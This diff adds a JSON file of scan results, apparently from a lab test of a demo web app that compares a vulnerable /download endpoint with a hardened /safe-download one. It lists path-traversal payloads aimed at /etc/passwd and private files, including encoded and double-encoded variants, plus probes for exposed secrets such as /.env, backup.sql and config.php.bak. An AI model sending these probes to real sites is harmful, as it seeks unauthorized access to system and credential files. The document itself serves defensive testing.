@@ -1,0 +1,134 @@
+[
+  {
+    "case": "01-plain",
+    "path": "/../../../etc/passwd",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "02-encoded-slashes",
+    "path": "/..%2F..%2F..%2Fetc%2Fpasswd",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "03-double-dots",
+    "path": "/....//....//....//etc/passwd",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "04-download-control",
+    "path": "/download?file=readme.txt",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "05-download-traversal",
+    "path": "/download?file=../private/demo.txt",
+    "status": 200,
+    "traversal_marker": true
+  },
+  {
+    "case": "06-download-encoded",
+    "path": "/download?file=%2e%2e%2fprivate%2fdemo.txt",
+    "status": 200,
+    "traversal_marker": true
+  },
+  {
+    "case": "07-download-double-encoded",
+    "path": "/download?file=%252e%252e%252fprivate%252fdemo.txt",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "08-safe-traversal",
+    "path": "/safe-download?file=../private/demo.txt",
+    "status": 403,
+    "traversal_marker": false
+  },
+  {
+    "case": "09-safe-encoded",
+    "path": "/safe-download?file=%2e%2e%2fprivate%2fdemo.txt",
+    "status": 403,
+    "traversal_marker": false
+  },
+  {
+    "case": "10-safe-control",
+    "path": "/safe-download?file=readme.txt",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "11-environment",
+    "path": "/.env",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "12-config",
+    "path": "/config.php",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "13-backup",
+    "path": "/backup.sql",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "14-bak",
+    "path": "/config.php.bak",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "15-old",
+    "path": "/index.php.old",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "16-backup-extension",
+    "path": "/site.backup",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "17-admin",
+    "path": "/admin",
+    "status": 403,
+    "traversal_marker": false
+  },
+  {
+    "case": "18-wordpress",
+    "path": "/wp-admin",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "19-phpmyadmin",
+    "path": "/phpmyadmin",
+    "status": 404,
+    "traversal_marker": false
+  },
+  {
+    "case": "20-directory",
+    "path": "/uploads/",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "21-headers",
+    "path": "/",
+    "status": 200,
+    "traversal_marker": false
+  },
+  {
+    "case": "22-baseline404",
+    "path": "/definitely-missing-9d2734",
+    "status": 404,
+    "traversal_marker": false
+  }
+]
